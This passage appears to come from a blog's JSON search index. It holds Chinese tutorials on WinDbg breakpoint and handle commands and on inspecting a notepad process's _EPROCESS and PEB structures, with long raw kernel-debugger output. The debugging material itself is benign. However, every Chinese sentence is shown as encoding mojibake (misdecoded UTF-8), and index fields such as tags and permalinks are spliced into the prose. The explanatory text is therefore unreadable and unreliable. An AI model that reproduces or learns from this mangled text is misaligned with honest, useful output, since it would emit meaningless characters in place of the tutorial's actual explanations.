æ¯”è¾ƒæœ‰ç”¨ï¼Œæ¯”å¦‚å¯¹äºå³æ’å³ç”¨è®¾å¤‡çš„é©±åŠ¨ç¨‹åºã€‚å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åœ¨å…¥å£å‡½æ•°å¤„è®¾ç½®æ–­ç‚¹ï¼š bu MyDriver!DriverEntry bm ç”¨äºè®¾ç½®ä¸€æ‰¹æ–­ç‚¹å‘½ä»¤æ ¼å¼ï¼šbm [Options] SymbolPattern [ç¬¬å‡ æ¬¡å‘½ä¸­æ–­ç‚¹æ—¶ä¸­æ–­åˆ°è°ƒè¯•å™¨] [â€œä¸€ç»„å‘½ä»¤ï¼Œç”¨åˆ†å·éš”å¼€â€] bmå‘½ä»¤è¦æ±‚ç›®æ ‡æ¨¡å—çš„è°ƒè¯•ç¬¦å·æœ‰ç±»å‹ä¿¡æ¯ï¼Œè¿™é€šå¸¸éœ€è¦ç§æœ‰ç¬¦å·æ–‡ä»¶ï¼Œå¦‚æœå¯¹å…¬å…±ç¬¦å·æ–‡ä»¶çš„æ¨¡å—ä½¿ç”¨bmå‘½ä»¤ï¼Œä¼šæç¤ºé”™è¯¯ä¿¡æ¯ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•æ˜¯ä½¿ç”¨ /a å¼€å…³ï¼Œå¼ºåˆ¶é’ˆå¯¹æ‰€æœ‰åŒ¹é…çš„ç¬¦å·è®¾ç½®æ–­ç‚¹ï¼Œæ— è®ºæ˜¯æ•°æ®è¿˜æ˜¯ä»£ç ï¼Œå»ºè®®åªæœ‰åœ¨ç¡®ä¿¡æ‰€æœ‰ç¬¦å·æ˜¯å‡½æ•°æ—¶æ‰ä½¿ç”¨ã€‚ bm MSVCR80D!print* å¯¹MSVCR80Dä¸­æ‰€æœ‰printå¼€å¤´çš„å‡½æ•°è®¾ç½®æ–­ç‚¹ ba è®¾ç½®è¯»ï¼Œå†™ï¼Œæ‰§è¡Œæ–­ç‚¹å‘½ä»¤æ ¼å¼ï¼šba[IDå·] Access Size [Options] [Address [ç¬¬å‡ æ¬¡å‘½ä¸­æ–­ç‚¹æ—¶ä¸­æ–­åˆ°è°ƒè¯•å™¨]] [â€œä¸€ç»„å‘½ä»¤ï¼Œç”¨åˆ†å·éš”å¼€â€]å…¶ä¸­AccessæŒ‡å®šè§¦å‘æ–­ç‚¹çš„è®¿é—®æ–¹å¼ï¼ŒSizeæŒ‡å®šè®¿é—®çš„é•¿åº¦ã€‚ Accessçš„å–å€¼å¦‚ä¸‹ï¼še è¯»å–å’Œæ‰§è¡ŒæŒ‡ä»¤æ—¶è§¦å‘æ–­ç‚¹ï¼Œå³è®¿é—®ä»£ç ç¡¬ä»¶æ–­ç‚¹r è¯»å–å’Œå†™å…¥æ•°æ®æ—¶è§¦å‘æ–­ç‚¹w å†™å…¥æ•°æ®æ—¶è§¦å‘æ–­ç‚¹i æ‰§è¡ŒI/Oè®¿é—®æ—¶è§¦å‘æ–­ç‚¹ Sizeçš„å–å€¼å¦‚ä¸‹ï¼šå¯¹äºè®¿é—®ä»£ç ç¡¬ä»¶æ–­ç‚¹ï¼Œå®ƒçš„å€¼åº”è¯¥ä¸º1å¯¹äºx86ç³»ç»Ÿï¼Œå¯ä»¥ä¸º1ï¼Œ2ï¼Œ4ï¼Œåˆ†åˆ«è¡¨ç¤º1å­—èŠ‚è®¿é—®ï¼Œå­—è®¿é—®å’ŒåŒå­—è®¿é—®å¯¹äºx64ç³»ç»Ÿï¼Œå¯ä»¥ä¸º1ï¼Œ2ï¼Œ4ï¼Œ 8å¯¹äºå®‰è…¾ç³»ç»Ÿï¼Œå¯ä»¥ä¸º1 - 0x80000000é—´çš„ä»»æ„2æ¬¡æ–¹å€¼ ba r1 0041717c å¯¹åœ°å€0041717cçš„1å­—èŠ‚è®¿é—®ï¼Œå­—è®¿é—®å’ŒåŒå­—è®¿é—®ï¼ˆè¯»å†™ï¼‰éƒ½ä¼šè§¦å‘è¯¥æ–­ç‚¹ bl åˆ—å‡ºå½“å‰æ‰€æœ‰æ–­ç‚¹ bc æ–­ç‚¹å· åˆ é™¤æ–­ç‚¹ æ–­ç‚¹å·å¯ä»¥ä½¿ç”¨*æ¥é€šé…æ‰€æœ‰æ–­ç‚¹ï¼Œä½¿ç”¨ - æ¥è¡¨ç¤ºä¸€ä¸ªèŒƒå›´ï¼Œæˆ–è€…ä½¿ç”¨é€—å·æ¥æŒ‡å®šå¤šä¸ªæ–­ç‚¹å· bd æ–­ç‚¹å· ç¦ç”¨æ–­ç‚¹ be æ–­ç‚¹å· å¯ç”¨æ–­ç‚¹ sxe ld:[dllåç§°] åŠ è½½æŸä¸ªDLLæ—¶ä¸‹æ–­ç‚¹ bu wininet!DllMain ä¸ sxe ld:wininet æ•ˆæœç›¸åŒbp kernel32!LoadLibraryW /bp kernel32!LoadLibraryA sxe ld:wininetåŠ è½½wininetæ—¶ä¸‹æ–­ç‚¹sxe ld:* / sxe ud:* åŒ¹é…æ‰€æœ‰DLLæ¨¡å— sxe ud:[dllåç§°] å¸è½½æŸä¸ªDLLæ—¶ä¸‹æ–­ç‚¹ æŸ¥çœ‹å¥æŸ„ä¿¡æ¯ å‘½ä»¤ è¯´æ˜ ç¤ºä¾‹ !handle æ‰©å±•æ˜¾ç¤ºç›®æ ‡ç³»ç»Ÿä¸­ä¸€ä¸ªæˆ–æ‰€æœ‰è¿›ç¨‹æ‹¥æœ‰çš„å¥æŸ„çš„ä¿¡æ¯ !handle 4 f ç”¨â€™fâ€™è¡¨ç¤ºæ˜¾ç¤ºæœ€è¯¦ç»†çš„ä¿¡æ¯ï¼š","tags":[{"name":"Windows/Windbg","slug":"Windows-Windbg","permalink":"https://hodlyounger.github.io/tags/Windows-Windbg/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘ä½¿ç”¨WindbgæŸ¥çœ‹PEB","date":"2024-08-31T01:41:20.239Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘PEB/","text":"æ¦‚è¿°ï¼šPEBæ˜¯ä»€ä¹ˆï¼Ÿä»¥åŠPEBåœ¨è¿›ç¨‹ä¸­çš„å®ä¾‹ å…ˆçœ‹ä¸€ä¸‹ æ‰§è¡Œä½“è¿›ç¨‹ç»“æ„å’Œå®ƒå†…åµŒçš„å†…æ ¸è¿›ç¨‹ç»“æ„çš„å…³é”®åŸŸ æ–¹ä¾¿ç†è§£ï¼Œå…·ä½“çš„ç»“æ„å¯ä½¿ç”¨ dt nt!_EPROCESS æŸ¥çœ‹ 0x01ã€å¦‚ä½•åœ¨windbgä¸­æŸ¥çœ‹è¯¥è¿›ç¨‹ç»“æ„ï¼Ÿ ç¯å¢ƒï¼šwindbgåŒæœºè°ƒè¯•æ¨¡å¼ï¼Œç›¸å…³æ­¥éª¤æŸ¥æ‰¾ windowsåŒæœºè°ƒè¯• æˆ– bcdseditã€‚ ä»¥ notepad.exe(è®°äº‹æœ¬) ä¸ºä¾‹ï¼Œwin+R è¿è¡Œ notepadã€‚è¾“å…¥ä»¥ä¸‹å‘½ä»¤å¾—åˆ° notepad çš„è¿›ç¨‹ç›¸å…³ä¿¡æ¯ 1&gt;!process 0 0 notepad.exe è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š åœ¨è¿™é‡Œè·å–åˆ° notepad çš„è¿›ç¨‹idä¸º ffff9105b1f38080ã€‚ æœ‰å›¾å¯çŸ¥ï¼Œæ•´ä¸ª notepad.exe çš„ä¿å­˜ç»“æ„ä¸ºä¸€ä¸ª _EPROCESSï¼Œè¿›è¡Œä¸‹ä¸€æ­¥ï¼ŒæŸ¥çœ‹è¿›ç¨‹ï¼š 1&gt;dt nt!_EPROCESS ffff9105b1f38080 è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238&gt;1: kd&gt; !openpid ffff9105b1f38080&gt;No export openpid found&gt;1: kd&gt; dt nt!_EPROCESS ffff9105b1f38080&gt;+0x000 Pcb : _KPROCESS&gt;+0x438 ProcessLock : _EX_PUSH_LOCK&gt;+0x440 UniqueProcessId : 0x00000000`000021c8 Void&gt;+0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff9105`af299748 - 0xffff9105`af8484c8 ]&gt;+0x458 RundownProtect : _EX_RUNDOWN_REF&gt;+0x460 Flags2 : 0xd000&gt;+0x460 JobNotReallyActive : 0y0&gt;+0x460 AccountingFolded : 0y0&gt;+0x460 NewProcessReported : 0y0&gt;+0x460 ExitProcessReported : 0y0&gt;+0x460 ReportCommitChanges : 0y0&gt;+0x460 LastReportMemory : 0y0&gt;+0x460 ForceWakeCharge : 0y0&gt;+0x460 CrossSessionCreate : 0y0&gt;+0x460 NeedsHandleRundown : 0y0&gt;+0x460 RefTraceEnabled : 0y0&gt;+0x460 PicoCreated : 0y0&gt;+0x460 EmptyJobEvaluated : 0y0&gt;+0x460 DefaultPagePriority : 0y101&gt;+0x460 PrimaryTokenFrozen : 0y1&gt;+0x460 ProcessVerifierTarget : 0y0&gt;+0x460 RestrictSetThreadContext : 0y0&gt;+0x460 AffinityPermanent : 0y0&gt;+0x460 AffinityUpdateEnable : 0y0&gt;+0x460 PropagateNode : 0y0&gt;+0x460 ExplicitAffinity : 0y0&gt;+0x460 ProcessExecutionState : 0y00&gt;+0x460 EnableReadVmLogging : 0y0&gt;+0x460 EnableWriteVmLogging : 0y0&gt;+0x460 FatalAccessTerminationRequested : 0y0&gt;+0x460 DisableSystemAllowedCpuSet : 0y0&gt;+0x460 ProcessStateChangeRequest : 0y00&gt;+0x460 ProcessStateChangeInProgress : 0y0&gt;+0x460 InPrivate : 0y0&gt;+0x464 Flags : 0x144d0c01&gt;+0x464 CreateReported : 0y1&gt;+0x464 NoDebugInherit : 0y0&gt;+0x464 ProcessExiting : 0y0&gt;+0x464 ProcessDelete : 0y0&gt;+0x464 ManageExecutableMemoryWrites : 0y0&gt;+0x464 VmDeleted : 0y0&gt;+0x464 OutswapEnabled : 0y0&gt;+0x464 Outswapped : 0y0&gt;+0x464 FailFastOnCommitFail : 0y0&gt;+0x464 Wow64VaSpace4Gb : 0y0&gt;+0x464 AddressSpaceInitialized : 0y11&gt;+0x464 SetTimerResolution : 0y0&gt;+0x464 BreakOnTermination : 0y0&gt;+0x464 DeprioritizeViews : 0y0&gt;+0x464 WriteWatch : 0y0&gt;+0x464 ProcessInSession : 0y1&gt;+0x464 OverrideAddressSpace : 0y0&gt;+0x464 HasAddressSpace : 0y1&gt;+0x464 LaunchPrefetched : 0y1&gt;+0x464 Background : 0y0&gt;+0x464 VmTopDown : 0y0&gt;+0x464 ImageNotifyDone : 0y1&gt;+0x464 PdeUpdateNeeded : 0y0&gt;+0x464 VdmAllowed : 0y0&gt;+0x464 ProcessRundown : 0y0&gt;+0x464 ProcessInserted : 0y1&gt;+0x464 DefaultIoPriority : 0y010&gt;+0x464 ProcessSelfDelete : 0y0&gt;+0x464 SetTimerResolutionLink : 0y0&gt;+0x468 CreateTime : _LARGE_INTEGER 0x01d9f901`1100d7bf&gt;+0x470 ProcessQuotaUsage : [2] 0x3a58&gt;+0x480 ProcessQuotaPeak : [2] 0x3a98&gt;+0x490 PeakVirtualSize : 0x00000201`09c0f000&gt;+0x498 VirtualSize : 0x00000201`09c0f000&gt;+0x4a0 SessionProcessLinks : _LIST_ENTRY [ 0xffff9105`b1681520 - 0xffff9105`af848520 ]&gt;+0x4b0 ExceptionPortData : 0xffff9105`aa569da0 Void&gt;+0x4b0 ExceptionPortValue : 0xffff9105`aa569da0&gt;+0x4b0 ExceptionPortState : 0y000&gt;+0x4b8 Token : _EX_FAST_REF&gt;+0x4c0 MmReserved : 0&gt;+0x4c8 AddressCreationLock : _EX_PUSH_LOCK&gt;+0x4d0 PageTableCommitmentLock : _EX_PUSH_LOCK&gt;+0x4d8 RotateInProgress : (null) &gt;+0x4e0 ForkInProgress : (null) &gt;+0x4e8 CommitChargeJob : (null) &gt;+0x4f0 CloneRoot : _RTL_AVL_TREE&gt;+0x4f8 NumberOfPrivatePages : 0x238&gt;+0x500 NumberOfLockedPages : 0&gt;+0x508 Win32Process : 0xfffffe41`85f6d620 Void&gt;+0x510 Job : (null) &gt;+0x518 SectionObject : 0xffffb084`5ea9d3b0 Void&gt;+0x520 SectionBaseAddress : 0x00007ff6`477c0000 Void&gt;+0x528 Cookie : 0x4118bb70&gt;+0x530 WorkingSetWatch : (null) &gt;+0x538 Win32WindowStation : 0x00000000`000000b4 Void&gt;+0x540 InheritedFromUniqueProcessId : 0x00000000`000018f4 Void&gt;+0x548 OwnerProcessId : 0x18f6&gt;+0x550 Peb : 0x0000002c`74cc7000 _PEB&gt;+0x558 Session : 0xffffc180`6a1ec000 _MM_SESSION_SPACE&gt;+0x560 Spare1 : (null) &gt;+0x568 QuotaBlock : 0xffff9105`aa072cc0 _EPROCESS_QUOTA_BLOCK&gt;+0x570 ObjectTable : 0xffffb084`5f8dbcc0 _HANDLE_TABLE&gt;+0x578 DebugPort : (null) &gt;+0x580 WoW64Process : (null) &gt;+0x588 DeviceMap : 0xffffb084`5e99c190 Void&gt;+0x590 EtwDataSource : 0xffff9105`b4004550 Void&gt;+0x598 PageDirectoryPte : 0&gt;+0x5a0 ImageFilePointer : 0xffff9105`acb3fc30 _FILE_OBJECT&gt;+0x5a8 ImageFileName : [15] &quot;notepad.exe&quot;&gt;+0x5b7 PriorityClass : 0x2 &#x27;&#x27;&gt;+0x5b8 SecurityPort : (null) &gt;+0x5c0 SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO&gt;+0x5c8 JobLinks : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]&gt;+0x5d8 HighestUserAddress : 0x00007fff`ffff0000 Void&gt;+0x5e0 ThreadListHead : _LIST_ENTRY [ 0xffff9105`af887a68 - 0xffff9105`aad93528 ]&gt;+0x5f0 ActiveThreads : 6&gt;+0x5f4 ImagePathHash : 0xc5670914&gt;+0x5f8 DefaultHardErrorProcessing : 1&gt;+0x5fc LastThreadExitStatus : 0n1&gt;+0x600 PrefetchTrace : _EX_FAST_REF&gt;+0x608 LockedPagesList : (null) &gt;+0x610 ReadOperationCount : _LARGE_INTEGER 0x0&gt;+0x618 WriteOperationCount : _LARGE_INTEGER 0x0&gt;+0x620 OtherOperationCount : _LARGE_INTEGER 0x30&gt;+0x628 ReadTransferCount : _LARGE_INTEGER 0x0&gt;+0x630 WriteTransferCount : _LARGE_INTEGER 0x0&gt;+0x638 OtherTransferCount : _LARGE_INTEGER 0x210&gt;+0x640 CommitChargeLimit : 0&gt;+0x648 CommitCharge : 0x31a&gt;+0x650 CommitChargePeak : 0x31a&gt;+0x680 Vm : _MMSUPPORT_FULL&gt;+0x7c0 MmProcessLinks : _LIST_ENTRY [ 0xffff9105`af299ac0 - 0xffff9105`af848840 ]&gt;+0x7d0 ModifiedPageCount : 1&gt;+0x7d4 ExitStatus : 0n259&gt;+0x7d8 VadRoot : _RTL_AVL_TREE&gt;+0x7e0 VadHint : 0xffff9105`ad4c8c20 Void&gt;+0x7e8 VadCount : 0x6a&gt;+0x7f0 VadPhysicalPages : 0&gt;+0x7f8 VadPhysicalPagesLimit : 0&gt;+0x800 AlpcContext : _ALPC_PROCESS_CONTEXT&gt;+0x820 TimerResolutionLink : _LIST_ENTRY [ 0x00000000`00000000 - 0x00000000`00000000 ]&gt;+0x830 TimerResolutionStackRecord : (null) &gt;+0x838 RequestedTimerResolution : 0&gt;+0x83c SmallestTimerResolution : 0&gt;+0x840 ExitTime : _LARGE_INTEGER 0x0&gt;+0x848 InvertedFunctionTable : (null) &gt;+0x850 InvertedFunctionTableLock : _EX_PUSH_LOCK&gt;+0x858 ActiveThreadsHighWatermark : 6&gt;+0x85c LargePrivateVadCount : 0&gt;+0x860 ThreadListLock : _EX_PUSH_LOCK&gt;+0x868 WnfContext : 0xffffb084`5fe9e180 Void&gt;+0x870 ServerSilo : (null) &gt;+0x878 SignatureLevel : 0 &#x27;&#x27;&gt;+0x879 SectionSignatureLevel : 0 &#x27;&#x27;&gt;+0x87a Protection : _PS_PROTECTION&gt;+0x87b HangCount : 0y000&gt;+0x87b GhostCount : 0y000&gt;+0x87b PrefilterException : 0y0&gt;+0x87c Flags3 : 0x41c000&gt;+0x87c Minimal : 0y0&gt;+0x87c ReplacingPageRoot : 0y0&gt;+0x87c Crashed : 0y0&gt;+0x87c JobVadsAreTracked : 0y0&gt;+0x87c VadTrackingDisabled : 0y0&gt;+0x87c AuxiliaryProcess : 0y0&gt;+0x87c SubsystemProcess : 0y0&gt;+0x87c IndirectCpuSets : 0y0&gt;+0x87c RelinquishedCommit : 0y0&gt;+0x87c HighGraphicsPriority : 0y0&gt;+0x87c CommitFailLogged : 0y0&gt;+0x87c ReserveFailLogged : 0y0&gt;+0x87c SystemProcess : 0y0&gt;+0x87c HideImageBaseAddresses : 0y0&gt;+0x87c AddressPolicyFrozen : 0y1&gt;+0x87c ProcessFirstResume : 0y1&gt;+0x87c ForegroundExternal : 0y1&gt;+0x87c ForegroundSystem : 0y0&gt;+0x87c HighMemoryPriority : 0y0&gt;+0x87c EnableProcessSuspendResumeLogging : 0y0&gt;+0x87c EnableThreadSuspendResumeLogging : 0y0&gt;+0x87c SecurityDomainChanged : 0y0&gt;+0x87c SecurityFreezeComplete : 0y1&gt;+0x87c VmProcessorHost : 0y0&gt;+0x87c VmProcessorHostTransition : 0y0&gt;+0x87c AltSyscall : 0y0&gt;+0x87c TimerResolutionIgnore : 0y0&gt;+0x87c DisallowUserTerminate : 0y0&gt;+0x880 DeviceAsid : 0n0&gt;+0x888 SvmData : (null) &gt;+0x890 SvmProcessLock : _EX_PUSH_LOCK&gt;+0x898 SvmLock : 0&gt;+0x8a0 SvmProcessDeviceListHead : _LIST_ENTRY [ 0xffff9105`b1f38920 - 0xffff9105`b1f38920 ]&gt;+0x8b0 LastFreezeInterruptTime : 0&gt;+0x8b8 DiskCounters : 0xffff9105`b1f38ac0 _PROCESS_DISK_COUNTERS&gt;+0x8c0 PicoContext : (null) &gt;+0x8c8 EnclaveTable : (null) &gt;+0x8d0 EnclaveNumber : 0&gt;+0x8d8 EnclaveLock : _EX_PUSH_LOCK&gt;+0x8e0 HighPriorityFaultsAllowed : 0&gt;+0x8e8 EnergyContext : 0xffff9105`b1f38ae8 _PO_PROCESS_ENERGY_CONTEXT&gt;+0x8f0 VmContext : (null) &gt;+0x8f8 SequenceNumber : 0xe9&gt;+0x900 CreateInterruptTime : 0xe8096541&gt;+0x908 CreateUnbiasedInterruptTime : 0xe8096541&gt;+0x910 TotalUnbiasedFrozenTime : 0&gt;+0x918 LastAppStateUpdateTime : 0xe8096541&gt;+0x920 LastAppStateUptime : 0y0000000000000000000000000000000000000000000000000000000000000 (0)&gt;+0x920 LastAppState : 0y000&gt;+0x928 SharedCommitCharge : 0xa2d&gt;+0x930 SharedCommitLock : _EX_PUSH_LOCK&gt;+0x938 SharedCommitLinks : _LIST_ENTRY [ 0xffffb084`5cc16358 - 0xffffb084`5e777688 ]&gt;+0x948 AllowedCpuSets : 0&gt;+0x950 DefaultCpuSets : 0&gt;+0x948 AllowedCpuSetsIndirect : (null) &gt;+0x950 DefaultCpuSetsIndirect : (null) &gt;+0x958 DiskIoAttribution : (null) &gt;+0x960 DxgProcess : 0xffffb084`5fe76de0 Void&gt;+0x968 Win32KFilterSet : 0&gt;+0x970 ProcessTimerDelay : _PS_INTERLOCKED_TIMER_DELAY_VALUES&gt;+0x978 KTimerSets : 0&gt;+0x97c KTimer2Sets : 0&gt;+0x980 ThreadTimerSets : 5&gt;+0x988 VirtualTimerListLock : 0&gt;+0x990 VirtualTimerListHead : _LIST_ENTRY [ 0xffff9105`b1f38a10 - 0xffff9105`b1f38a10 ]&gt;+0x9a0 WakeChannel : _WNF_STATE_NAME&gt;+0x9a0 WakeInfo : _PS_PROCESS_WAKE_INFORMATION&gt;+0x9d0 MitigationFlags : 0x21&gt;+0x9d0 MitigationFlagsValues : &lt;anonymous-tag&gt;&gt;+0x9d4 MitigationFlags2 : 0x40000000&gt;+0x9d4 MitigationFlags2Values : &lt;anonymous-tag&gt;&gt;+0x9d8 PartitionObject : 0xffff9105`a589c260 Void&gt;+0x9e0 SecurityDomain : 0x00000001`00000032&gt;+0x9e8 ParentSecurityDomain : 0x00000001`00000032&gt;+0x9f0 CoverageSamplerContext : (null) &gt;+0x9f8 MmHotPatchContext : (null) &gt;+0xa00 DynamicEHContinuationTargetsTree : _RTL_AVL_TREE&gt;+0xa08 DynamicEHContinuationTargetsLock : _EX_PUSH_LOCK&gt;+0xa10 DynamicEnforcedCetCompatibleRanges : _PS_DYNAMIC_ENFORCED_ADDRESS_RANGES&gt;+0xa20 DisabledComponentFlags : 0&gt;+0xa28 PathRedirectionHashes : (null) è¿™é‡Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šä¿¡æ¯ï¼Œæ¯”å¦‚è¿›ç¨‹çš„ Pcbï¼ˆè¿›ç¨‹æ§åˆ¶å—ï¼‰çš„ç»“æ„ä½“ä¸º _KPROCESSã€‚è¿›ç¨‹çš„æ˜ åƒå(ImageFileName)ä¸º notepad.exe 0x02ã€PEBä¸ä¸Šè¿° _EPROCESS çš„å…³ç³» ä¸Šè¿°çœ‹åˆ°çš„ä¿¡æ¯ _EPROCESS å‡ä½äºç³»ç»Ÿç©ºé—´ä¸­ã€‚ è€Œè¿›ç¨‹ç¯å¢ƒå—ï¼ˆPEBï¼‰æ˜¯ä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„å­˜åœ¨ï¼Œå®ƒä½äºè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ã€‚å› ä¸ºPEBçš„ç‰¹æ®Šæ€§ï¼Œæ¯”å¦‚ç¯å¢ƒå˜é‡ã€è¿›ç¨‹ä¿¡æ¯ã€çº¿ç¨‹ç­‰ä¸åŒï¼Œå› æ­¤PEBå¯ä»¥çœ‹åšæ˜¯ä¸€ä¸ªç§æœ‰çš„å˜é‡ï¼Œå®šä¹‰äº†æ¯ä¸ªç¨‹åºå†…éƒ¨æ‰€éœ€è¦çš„æˆå‘˜ã€‚æœ‰å…³PEBç»“æ„ä½“å¯ä»¥åœ¨ä¸»é¡µä¸­æœç´¢ WOW64é€šè¿‡PEBè·å–32/64ä½è¿›ç¨‹æ¨¡å—ä¿¡æ¯ æŸ¥çœ‹ã€‚ è¡¥å……ï¼š åœ¨ windbg è°ƒè¯•ä¸­ï¼Œé»˜è®¤ä½¿ç”¨ !PEB å‘½ä»¤æ—¶ï¼ŒæŸ¥çœ‹çš„æ˜¯ CPU 0 ä¸Šå½“å‰è¿è¡Œçš„çº¿ç¨‹æ‰€å±è¿›ç¨‹çš„è¿›ç¨‹ç¯å¢ƒå—ï¼ˆPEBï¼‰ã€‚ å¦‚æœè¦æŸ¥çœ‹å…·ä½“æŸä¸€è¿›ç¨‹çš„ç¯å¢ƒå—ï¼Œéœ€è¦å…ˆåˆ‡æ¢åˆ°è¯¥è¿›ç¨‹ç©ºé—´ï¼Œå†ä½¿ç”¨ !PEB å‘½ä»¤æŸ¥çœ‹ã€‚ PEBæ¦‚è¿° PEB(Process Environment Block), å³è¿›ç¨‹ç¯å¢ƒå—ã€‚ä¸åŒäº EPROCESSå’Œç›¸å…³çš„æ•°æ®ç»“æ„ï¼ˆå­˜å‚¨äºç³»ç»Ÿç©ºé—´ä¸­ï¼‰ï¼Œè¿›ç¨‹ç¯å¢ƒå—ä½äºè¿›ç¨‹åœ°å€ç©ºé—´ä¸­ï¼ˆå› ä¸ºå®ƒåŒ…å«ä¸€äº›éœ€è¦ç”±æ¨¡å¼æ¨¡å¼ä»£ç æ¥ä¿®æ”¹çš„ä¿¡æ¯ï¼‰ã€‚PEBåŒ…å«äº†æ˜ åƒåŠ è½½å™¨ã€å †ç®¡ç†å™¨ä»¥åŠå…¶ä»–éœ€è¦ä»ç”¨æˆ·è¿·å¤±è®¿é—®å®ƒçš„Windowsç»„ä»¶æ‰€éœ€çš„ä¿¡æ¯ã€‚PEBåŸŸå¦‚ä¸‹æ‰€ç¤ºï¼š .runjvujxebvc{} PEB å®ä¾‹ åœ¨å†…æ ¸è°ƒè¯•å™¨ä¸­åˆ©ç”¨ !PEB å‘½ä»¤ï¼Œä½ å¯ä»¥å°† PEB ç»“æ„è½¬å‚¨å‡ºæ¥ï¼Œä¼šæ˜¾ç¤º CPU 0 ä¸Šå½“å‰è¿è¡Œç€çš„çº¿ç¨‹æ‰€å±è¿›ç¨‹çš„PEBã€‚ å¦‚ä¸‹æ‰€ç¤ºä¸ºè¿›ç¨‹ CPU 0 ä¸Šè¿è¡Œçº¿ç¨‹æ‰€å±è¿›ç¨‹çš„PEB 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011: kd&gt; !pebPEB at 000000e4829b9000 InheritedAddressSpace: No ReadImageFileExecOptions: No BeingDebugged: No ImageBaseAddress: 00007ff6cfaf0000 NtGlobalFlag: 0 NtGlobalFlag2: 0 Ldr 00007ffe587bb4c0 Ldr.Initialized: Yes Ldr.InInitializationOrderModuleList: 00000264d3e03ba0 . 00000264d3e690a0 Ldr.InLoadOrderModuleList: 00000264d3e03d10 . 00000264d3e69080 Ldr.InMemoryOrderModuleList: 00000264d3e03d20 . 00000264d3e69090 Base TimeStamp Module 7ff6cfaf0000 058e175a Dec 15 00:22:50 1972 C:\\Windows\\System32\\svchost.exe 7ffe58650000 4544b4a1 Oct 29 22:03:13 2006 C:\\Windows\\SYSTEM32\\ntdll.dll 7ffe56bc0000 d714134a May 06 10:04:58 2084 C:\\Windows\\System32\\KERNEL32.DLL 7ffe561a0000 0e9c5eae Oct 08 11:21:18 1977 C:\\Windows\\System32\\KERNELBASE.dll 7ffe56e80000 54cbb3a3 Jan 31 00:38:59 2015 C:\\Windows\\System32\\sechost.dll 7ffe56c80000 f564aeb4 Jun 18 23:37:24 2100 C:\\Windows\\System32\\RPCRT4.dll 7ffe55ff0000 2bd748bf Apr 23 09:39:11 1993 C:\\Windows\\System32\\ucrtbase.dll 7ffe576c0000 1cae0c4a Apr 01 09:54:18 1985 C:\\Windows\\System32\\combase.dll 7ffe53d00000 f0713fcd Oct 30 14:42:21 2097 C:\\Windows\\SYSTEM32\\kernel.appcore.dll 7ffe57da0000 564f9f39 Nov 21 06:31:21 2015 C:\\Windows\\System32\\msvcrt.dll 7ffe56120000 8fb0d55f May 24 07:27:27 2046 C:\\Windows\\System32\\bcryptPrimitives.dll 7ffe57050000 13a6e19d Jun 13 08:23:57 1980 C:\\Windows\\System32\\user32.dll 7ffe560f0000 0dcd0213 May 04 04:26:59 1977 C:\\Windows\\System32\\win32u.dll 7ffe57d10000 a19db164 Dec 04 01:05:40 2055 C:\\Windows\\System32\\GDI32.dll 7ffe55e80000 c4d50445 Aug 24 08:03:17 2074 C:\\Windows\\System32\\gdi32full.dll 7ffe55d90000 39255ccf May 19 23:25:03 2000 C:\\Windows\\System32\\msvcp_win.dll 7ffe1e780000 fe47fc1d Mar 10 20:14:21 2105 c:\\windows\\system32\\wscsvc.dll 7ffe54a30000 9f6e1bc3 Oct 05 14:10:11 2054 c:\\windows\\system32\\FirewallAPI.dll 7ffe551e0000 40054298 Jan 14 21:22:32 2004 c:\\windows\\system32\\DNSAPI.dll 7ffe551d0000 fcf57d1b Jun 27 02:06:19 2104 c:\\windows\\system32\\netutils.dll 7ffe55190000 cf9a121a May 15 14:41:30 2080 C:\\Windows\\SYSTEM32\\IPHLPAPI.DLL 7ffe57a20000 aa9c8581 Sep 14 18:48:33 2060 C:\\Windows\\System32\\NSI.dll 7ffe54a00000 752d58d6 Apr 18 21:02:14 2032 c:\\windows\\system32\\fwbase.dll 7ffe55720000 409dec87 May 09 16:32:07 2004 C:\\Windows\\SYSTEM32\\WLDP.DLL 7ffe56830000 15fd8d3b Sep 10 10:51:39 1981 C:\\Windows\\System32\\advapi32.dll 7ffe1e2c0000 1ef1f3ef Jun 15 06:45:03 1986 C:\\Windows\\SYSTEM32\\VbsApi.dll 7ffe1e280000 873e8a3a Nov 26 04:06:18 2041 C:\\Windows\\SYSTEM32\\SecurityCenterBroker.dll 7ffe56520000 ad1aff4d Jan 12 01:54:21 2062 C:\\Windows\\System32\\CRYPT32.dll 7ffe55f90000 3327e4fa Mar 13 19:28:58 1997 C:\\Windows\\System32\\WINTRUST.dll 7ffe558a0000 9dcceb6f Nov 23 03:28:47 2053 C:\\Windows\\SYSTEM32\\MSASN1.dll 7ffe56a40000 db9f728a Oct 05 20:37:30 2086 C:\\Windows\\System32\\clbcatq.dll 7ffe56db0000 f963cc3a Aug 04 00:52:10 2102 C:\\Windows\\System32\\OLEAUT32.dll 7ffe4a290000 d22ad5a9 Sep 25 18:42:49 2081 C:\\Windows\\system32\\wbem\\wbemprox.dll 